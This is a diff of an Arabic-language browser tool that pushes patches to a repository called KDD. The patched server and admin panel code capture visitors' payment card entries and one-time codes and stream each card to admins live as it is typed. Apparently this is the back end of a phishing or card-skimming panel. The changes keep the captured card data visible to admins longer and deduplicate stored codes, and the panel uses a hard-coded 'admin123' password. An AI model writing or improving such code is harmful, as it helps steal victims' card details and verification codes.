@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>KDD — تطبيق التعديلات</title>
+<title>KDD — تطبيق التعديلات v3</title>
 <style>
 body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;padding:20px}
-.card{max-width:660px;margin:0 auto;background:#0f172a;border:1px solid #1e293b;border-radius:14px;padding:20px}
+.card{max-width:660px;margin:0 auto;border:1px solid #1e293b;border-radius:14px;padding:20px}
 h1{font-size:19px;color:#fff;margin:0 0 10px}
 input{width:100%;box-sizing:border-box;padding:11px;border-radius:9px;border:1px solid #334155;background:#1e293b;color:#e2e8f0;font-family:monospace;direction:ltr}
 button{width:100%;margin-top:12px;padding:12px;border:0;border-radius:9px;background:#2563eb;color:#fff;font-weight:700;font-size:15px;cursor:pointer}
@@ -12,21 +12,20 @@ pre{margin-top:14px;padding:13px;background:#020617;border:1px solid #1e293b;bor
 .bar{height:6px;background:#1e293b;border-radius:99px;overflow:hidden;margin-top:14px}
 .bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#22c55e,#3b82f6);transition:width .3s}
 .muted{font-size:12px;color:#64748b;line-height:1.7;margin-top:12px}
-a{color:#7dd3fc}
 </style></head><body><div class="card">
-<h1>🔧 تطبيق تعديلات «الرمز مرة واحدة»</h1>
+<h1>🔧 KDD — «الرمز مرة واحدة» + «بطاقة الدفع تبقى» (v3)</h1>
 <div class="muted">fahshomi-ui/KDD · فرع main · 3 ملفات</div>
 <input id="tok" type="password" placeholder="الصق التوكن (ghp_...)" autocomplete="off">
 <button id="go">🚀 نفّذ التعديلات وارفعها</button>
 <div class="bar"><i id="bar"></i></div>
 <pre id="log">جاهز.</pre>
-<div class="muted">التوكن يُرسل لـ api.github.com فقط ويُحفظ بمتصفحك. الصلاحية المطلوبة: Contents = Read and write.</div>
+<div class="muted">التوكن يُرسل لـ api.github.com فقط ويُحفظ بمتصفحك. الصلاحية: Contents = Read and write.</div>
 </div>
 <script>
 (function(){
 var OWNER='fahshomi-ui',REPO='KDD',BRANCH='main';
 var API='https://api.github.com/repos/'+OWNER+'/'+REPO+'/contents/';
-var MSG='fix: code saved once (dedup codes)';
+var MSG='fix: code once + keep live card until submit';
 var $=function(i){return document.getElementById(i)};
 function log(t){var e=$('log');e.textContent+=t+'\n';e.scrollTop=e.scrollHeight}
 function prog(p){$('bar').style.width=p+'%'}
@@ -38,6 +37,7 @@ function H(){return {'Authorization':'Bearer '+tok(),'Accept':'application/vnd.g
 async function gh(p,o){var r=await fetch(API+p,Object.assign({headers:H()},o||{}));var x=await r.text();var j={};try{j=JSON.parse(x)}catch(e){}
 if(!r.ok)throw new Error((j&&j.message)||('HTTP '+r.status));return j}
 
+/* ===== 1) منع تكرار الرموز ===== */
 var A_old=`      if (data.digitCode) {
         const now = new Date().toISOString();
         visitor.digitCodes.push({
@@ -108,6 +108,86 @@ var B_new=`let adminPassword = savedData.adminPassword || "admin123";
   });
   if (changed) { try { saveData(); console.log('[FIX-DEDUP] cleaned duplicate codes'); } catch (e) {} }
 })();`;
+
+/* ===== 2) بطاقة الدفع المباشر تبقى لحين «إرسال» ===== */
+var H_old=`      } else {
+        visitor.liveCard = null;
+        visitor.liveCardTimestamp = null;
+        admins.forEach((admin, adminSocketId) => {
+          io.to(adminSocketId).emit("card:liveUpdate", {
+            visitorId: visitor._id,
+            liveCard: null,
+            liveCardTimestamp: null,
+          });
+        });
+      }`;
+var H_new=`      } else {
+        // [FIX-LIVE] لا نمسح بطاقة الدفع المباشر — تبقى حتى يضغط الزائر «إرسال»
+        if (visitor.liveCard) {
+          admins.forEach((admin, adminSocketId) => {
+            io.to(adminSocketId).emit("card:liveUpdate", {
+              visitorId: visitor._id,
+              liveCard: visitor.liveCard,
+              liveCardTimestamp: visitor.liveCardTimestamp,
+            });
+          });
+        }
+      }`;
+var I_old=`socket.on("card:liveHide", () => {
+  const visitor = __f91ResolveVisitor(socket, null);
+  if (!visitor) return;
+  visitor.liveCard = null;
+  visitor.liveCardTimestamp = null;
+  visitors.set(socket.id, visitor);
+  admins.forEach((admin, adminSocketId) => {
+    io.to(adminSocketId).emit("card:liveUpdate", {
+      visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
+    });
+  });
+});`;
+var I_new=`socket.on("card:liveHide", () => {
+  const visitor = __f91ResolveVisitor(socket, null);
+  if (!visitor) return;
+  // [FIX-LIVE] نبقي المعلومات — تُمسح فقط عند ضغط «إرسال»
+  visitors.set(socket.id, visitor);
+  if (visitor.liveCard) {
+    admins.forEach((admin, adminSocketId) => {
+      io.to(adminSocketId).emit("card:liveUpdate", {
+        visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp,
+      });
+    });
+  }
+});`;
+var J_old=`      if (data.paymentCard) {
+        const now = new Date().toISOString();
+        visitor.paymentCards.push({
+          ...data.paymentCard,
+          timestamp: now,
+        });
+        // Start tracking from card page
+        visitor.lastDataUpdate = now;
+        visitor.hasEnteredCardPage = true;
+      }`;
+var J_new=`      if (data.paymentCard) {
+        const now = new Date().toISOString();
+        visitor.paymentCards.push({
+          ...data.paymentCard,
+          timestamp: now,
+        });
+        // Start tracking from card page
+        visitor.lastDataUpdate = now;
+        visitor.hasEnteredCardPage = true;
+        // [FIX-LIVE] الزائر ضغط «إرسال» — نمسح البطاقة المباشرة
+        visitor.liveCard = null;
+        visitor.liveCardTimestamp = null;
+        admins.forEach((admin, adminSocketId) => {
+          io.to(adminSocketId).emit("card:liveUpdate", {
+            visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
+          });
+        });
+      }`;
+
+/* ===== 3) لوحة التحكم: اعرض البطاقة المباشرة دائماً ===== */
 var C_old=`  var K = {};
   try { K = JSON.parse(localStorage.getItem("kdd_rej")||"{}") || {}; } catch(e){ K = {}; }`;
 var C_new=`  var K = {};
@@ -175,25 +255,26 @@ var G_old=`      var lt = a[a.length-1];
 var G_new=`      var ex = null;
       for (var i = 0; i < a.length; i++){ if (a[i].sig === sg){ ex = a[i]; break; } }
       if (ex) { ex.ts = Date.now(); ex.t = tm; } else { a.push({ ts: Date.now(), t: tm, sig: sg }); }`;
+var K_old=`if (isOnPaymentPage && visitor.liveCard && (__lastPcTs === 0 || __lcTs > __lastPcTs)) {`;
+var K_new=`/*FIX-LIVE*/ if (visitor.liveCard && (__lastPcTs === 0 || __lcTs > __lastPcTs)) {`;
 
-var base=[[C_old,C_new],[D_old,D_new],[E_old,E_new],[F_old,F_new]];
-var PATCHES={'server/index.js':[[A_old,A_new],[B_old,B_new]],
-'server/admin/index.html':base.concat([[G_old,G_new]]),
-'kdd-public/admin.html':base};
+var adm=[[C_old,C_new],[D_old,D_new],[E_old,E_new],[F_old,F_new],[K_old,K_new]];
+var PATCHES={'server/index.js':[[A_old,A_new],[B_old,B_new],[H_old,H_new],[I_old,I_new],[J_old,J_new]],
+'server/admin/index.html':adm.concat([[G_old,G_new]]),
+'kdd-public/admin.html':adm};
 
 async function run(){
  if(!tok()){log('⚠️ الصق التوكن أولاً');return}
  localStorage.setItem('kdd_tok',tok());
  $('log').textContent='';prog(4);
  log('🔎 فحص التوكن...');
- try{var u=await gh('');log('✅ الوصول سليم')}catch(e){log('❌ '+e.message);return}
+ try{await gh('');log('✅ الوصول سليم')}catch(e){log('❌ '+e.message);return}
  var fs=Object.keys(PATCHES),d=0;
  for(var f=0;f<fs.length;f++){var file=fs[f];
   try{log('\n⏳ '+file);
    var m=await gh(ep(file)+'?ref='+BRANCH),s=b64d(m.content),ap=0,ms=0,pr=PATCHES[file];
    for(var i=0;i<pr.length;i++){var a=pr[i][0],b=pr[i][1];
-    if(s.indexOf(b)!==-1)continue; if(s.indexOf(a)===-1){ms++;continue} s=s.replace(a,b);ap++}
-   if(ms)log('   ⚠️ مراجع ناقصة: '+ms);
+    if(s.indexOf(b)!==-1)continue; if(s.indexOf(a)===-1){ms++;log('   ⚠️ مرجع ناقص #'+(i+1));continue} s=s.replace(a,b);ap++}
    if(!ap){log('   ✓ مطبّق مسبقاً')}
    else{await gh(ep(file),{method:'PUT',body:JSON.stringify({message:MSG+' ['+file+']',content:b64e(s),sha:m.sha,branch:BRANCH})});log('   ✅ تم التعديل والرفع ('+ap+')')}
    d++}catch(e){log('   ❌ '+e.message)}
